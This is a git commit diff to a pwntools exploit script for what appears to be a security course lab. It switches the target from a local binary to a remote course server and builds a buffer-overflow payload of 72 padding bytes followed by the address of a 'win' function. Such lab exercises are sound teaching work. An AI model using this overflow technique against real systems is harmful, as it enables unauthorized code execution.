cc3695bf512223741991cfefd0d2155aa9fb0390
Joshua Bartholomew <joshua.c.bartholomew@gmail.com>
2023-08-30 22:54:36 -0500

    Activated the remote functionality

--- lab2-1.py
+++ lab2-1.py
@@ -16,9 +16,9 @@ if __name__ == "__main__":
     win_function_address = victim_binary.symbols["win"]
     
     # I run the process.
-    # process_to_exploit = pwn.remote("csc748.hostbin.org", 7021)
+    process_to_exploit = pwn.remote("csc748.hostbin.org", 7021)
     # This next line can replace the one above for testing against a local binary.
-    process_to_exploit = pwn.process("./lab2-1.bin")
+    # process_to_exploit = pwn.process("./lab2-1.bin")
 
     buffer_overflower = b"0"*72
     instruction_redirect = pwn.p64(win_function_address)
